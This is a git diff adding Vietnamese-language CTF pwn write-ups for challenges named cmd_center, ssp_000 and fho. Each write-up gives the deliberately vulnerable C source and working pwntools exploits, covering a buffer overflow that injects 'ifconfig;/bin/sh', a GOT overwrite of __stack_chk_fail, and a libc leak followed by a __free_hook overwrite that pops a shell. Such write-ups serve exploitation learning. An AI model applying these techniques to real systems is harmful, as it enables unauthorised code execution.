@@ -1820,7 +1820,7 @@ int main()
 
 ![image](https://user-images.githubusercontent.com/111769169/228557377-ca9363c4-9230-4525-92dd-43caaace88e6.png)
 
-# off_by_one_001
+# off_by_one_000
 
 ## Ý tưởng
 
@@ -1869,7 +1869,7 @@ def main():
     r = conn()
 
     payload = p32(exe.sym['get_shell']) * (256 // 4)
-    
+
     r.sendafter(b"Name: ", payload)
     r.interactive()
 
@@ -1881,3 +1881,334 @@ if __name__ == "__main__":
 </details>
 
 ![image](https://user-images.githubusercontent.com/111769169/228579098-6c05078e-1adc-4ee6-af08-d7c4766b994b.png)
+
+# cmd_center
+
+## Source
+
+<details> <summary> IDA </summary>
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-130h] BYREF
+  char s1[10]; // [rsp+20h] [rbp-110h] BYREF
+  __int16 v5; // [rsp+2Ah] [rbp-106h]
+  int v6; // [rsp+2Ch] [rbp-104h]
+  char v7[240]; // [rsp+30h] [rbp-100h] BYREF
+  _QWORD v8[2]; // [rsp+120h] [rbp-10h] BYREF
+
+  v8[1] = __readfsqword(0x28u);
+  strcpy(s1, "ifconfig");
+  s1[9] = 0;
+  v5 = 0;
+  v6 = 0;
+  memset(v7, 0, sizeof(v7));
+  init(v8, argv, v7);
+  printf("Center name: ");
+  read(0, buf, 100uLL);
+  if ( !strncmp(s1, "ifconfig", 8uLL) )
+    system(s1);
+  else
+    puts("Something is wrong!");
+  exit(0);
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ban đầu đọc source C khá lú nên ta coi ida cho nó chắc
+- ta thấy lỗi BOF ở `read(0, buf, 100uLL);`, ở đây ta cần phải BOF để ghi đè vào s1 để có thể thoả hàm if để chạy `system(s1)`
+- Đây là một số lệnh
+
+![image](https://user-images.githubusercontent.com/111769169/228616963-888b11dc-cbff-488f-8dba-e586f3c572c1.png)
+![image](https://user-images.githubusercontent.com/111769169/228617045-b3c47761-fd67-4ee4-a083-26c790367579.png)
+
+- Ta sẽ sử dụng dấu `;` để có thể thực thi cả 2 câu lệnh, ifconfig và /bin/sh
+
+## Thực thi
+
+- Đầu tiên ta cần tính offset từ buf đến s1
+
+```
+>>> -0x130 -- 0x110
+-32
+```
+
+- ow đến địa chỉ s1 ta sẽ nhập `ifconfig;/bin/sh`
+
+## Kết quả
+
+```
+Center name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaifconfig;/bin/sh
+ls
+cmd_center
+flag
+run.sh
+cat flag
+DH{f4c11bf9ea5a1df24175ee4d11da0d16}
+```
+
+# ssp_000
+
+## Source
+
+<details> <summary> source C </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+void get_shell() {
+    system("/bin/sh");
+}
+
+int main(int argc, char *argv[]) {
+    long addr;
+    long value;
+    char buf[0x40] = {};
+
+    initialize();
+
+
+    read(0, buf, 0x80);
+
+    printf("Addr : ");
+    scanf("%ld", &addr);
+    printf("Value : ");
+    scanf("%ld", &value);
+
+    *(long *)addr = value;
+
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Chương trình cho phép ta thay đổi dữ liệu của một địa chỉ
+- Ta sẽ thay đổi `__stack_chk_fail` thành get_shell() (em tham khảo wu)
+- Để có thể thay đổi được, ta sẽ ghi vào địa chỉ của `____stack_chk_fail` thành địa chỉ chỉ của get_shell()
+
+## Thực thi
+
+- Ta tính được offset từ đầu khi ghi đè canary là 80 ( vì nếu chương trình kiểm tra canary đã thay đổi thì nó sẽ thực thi `__stack_chk_fail`)
+- Khi được hỏi địa chỉ thì ta sẽ ghi vào địa chỉ của `__stack_chk_fail@got` dưới dạng int
+  và địa chỉ get_shell()
+
+## Kết quả
+
+```python
+from pwn import *
+
+exe = ELF("./ssp_000")
+# libc = ELF("./libc-2.27.so")
+# ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+
+def main():
+    r = conn()
+
+    r.sendline(b"a" * 80)
+    r.sendlineafter(b"Addr : ", str(exe.got['__stack_chk_fail']))
+    r.sendlineafter(b"Value : ", str(exe.sym['get_shell']))
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+![image](https://user-images.githubusercontent.com/111769169/228650651-ae36d4b8-16cd-4f8a-ad7b-a8a4a01c3f5e.png)
+
+# fho
+
+## source C
+
+```c
+// Name: fho.c
+// Compile: gcc -o fho fho.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+  char buf[0x30];
+  unsigned long long *addr;
+  unsigned long long value;
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  puts("[1] Stack buffer overflow");
+  printf("Buf: ");
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  puts("[2] Arbitary-Address-Write");
+  printf("To write: ");
+  scanf("%llu", &addr);
+  printf("With: ");
+  scanf("%llu", &value);
+  printf("[%p] = %llu\n", addr, value);
+  *addr = value;
+
+  puts("[3] Arbitrary-Address-Free");
+  printf("To free: ");
+  scanf("%llu", &addr);
+  free(addr);
+
+  return 0;
+}
+```
+
+## Ý tưởng
+
+- Bài này em có tham khảo một xíu
+- Bài này không thể BOF được vì chúng ta chỉ có thể sử dụng 1 lần hàm read(), nếu sử dụng để leak canary thì không thể nào ret2libc
+- Do đó mục tiêu của ta là thay đổi hàm nào đó
+- Ở đây ta có chú ý có hàm free(), hàm free() chỉ có thể sử dụng trên địa chỉ động do malloc() tạo ra, nếu truy cập vào địa chỉ nào khác sẽ gây lỗi (theo chat-gdb)
+- Ở đây ta sẽ dùng hook ow
+- Ta sẽ dùng lần nhập thứ 2 để thay đổi địa chỉ hàm free() thành hàm system chẳng hạn
+- Sau đó dùng lần nhập thứ 3 trỏ đến chuỗi /bin/sh
+- Trên lí thuyết có thể là vậy
+
+## Thực thi
+
+### Leak libc
+
+- Khi ta gdb và kiểm tra thì bên trên canary không có giá trị nào để ta có thể leak, do đó buộc phải leak libc, uy tín nhất là leak rip vì tỉ lệ đúng cao nhất
+
+![image](https://user-images.githubusercontent.com/111769169/228671213-1ad3714b-63f6-49a9-bb26-1a7cc26ea3bc.png)
+
+> tình hình là khi debug động thì có các giá trị lạ (có thể là rác) bên trong buf, còn debug thì sẽ giống như hình, do đó vẫn chọn rip để leak
+
+- Tính offset
+
+```python
+    payload = b"a" * 72
+    r.sendlineafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 72)
+    leak_libc = u64(r.recv(6) + b"\0\0")
+    libc.address = leak_libc - 137994
+    log.info("leak: " + hex(leak_libc))
+    log.info("base: " + hex(libc.address))
+```
+
+- Kiểm tra, có đoạn 0x000 chắc là đúng r =)))
+
+![image](https://user-images.githubusercontent.com/111769169/228674641-94732b7c-7b63-480b-bb07-7564268ea63d.png)
+
+### Ghi đè free
+
+- Tương tự như một vài bài trước, do chương trình cho phép ta sửa giá trị của một địa chỉ nên ta sẽ dựa vào đó để thay đổi got của free thành địa chỉ của system
+- Do chương trình yêu cầu nhập vào số nguyên dương nên ta dùng str
+
+```python
+    payload = libc.sym['__free_hook']
+    r.sendlineafter(b"To write: ", str(payload))
+    payload = libc.sym['system']
+    r.sendlineafter(b"With: ", str(payload))
+```
+
+### ghi /bin/sh
+
+- do system và free đều chỉ sử dụng một thanh rdi để thực thi, nên ta sẽ ghi địa chỉ chuỗi /bin/sh trong file libc vào addr khi đó hàm free này đã trở thành system và nhận đối số là địa chỉ /bin/sh
+
+```python
+    payload = next(libc.search(b'/bin/sh'))
+    r.sendlineafter(b"To free: ", str(payload))
+    r.interactive()
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/228676900-5f1a04b3-26cf-45b7-95a6-52914d17fcde.png)
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./fho_patched")
+libc = ELF("./libc-2.27.so")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript='''
+                   b*main+129
+                   b*main+134
+                   b*main+211
+                   b*main+252
+                   b*main+344
+                   c
+                   ''')
+        input()
+    else:
+        r = remote("host3.dreamhack.games", 19902   )
+
+    return r
+
+
+def main():
+    r = conn()
+
+    payload = b"a" * 72
+    r.sendlineafter(b"Buf: ", payload)
+    r.recvuntil(b"a" * 72)
+    leak_libc = u64(r.recv(6) + b"\0\0")
+    libc.address = leak_libc - 137994
+    log.info("leak: " + hex(leak_libc))
+    log.info("base: " + hex(libc.address))
+
+    payload = libc.sym['__free_hook']
+    r.sendlineafter(b"To write: ", str(payload))
+    payload = libc.sym['system']
+    r.sendlineafter(b"With: ", str(payload))
+
+    payload = next(libc.search(b'/bin/sh'))
+    r.sendlineafter(b"To free: ", str(payload))
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
